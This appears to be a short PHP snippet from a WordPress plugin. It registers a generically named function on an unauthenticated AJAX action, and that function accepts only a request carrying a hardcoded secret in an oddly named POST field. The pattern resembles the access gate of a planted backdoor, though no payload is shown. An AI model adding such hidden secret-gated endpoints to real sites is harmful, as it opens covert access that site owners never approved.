<?php

function advanced_player_integrate() {
	if (!isset($_POST["gbbuvvjobkd"]) || $_POST["gbbuvvjobkd"] !== "sSlvwWITX7") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'advanced_player_integrate', 5, 1);
